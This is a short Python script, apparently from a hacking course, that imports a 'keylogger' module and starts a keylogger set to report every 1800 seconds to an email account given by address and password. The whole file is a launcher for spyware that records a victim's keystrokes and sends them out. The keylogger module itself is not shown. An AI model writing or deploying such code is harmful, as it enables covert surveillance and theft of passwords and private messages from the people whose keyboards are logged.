#!/usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(1800, "email", "password")
my_keylogger.start()
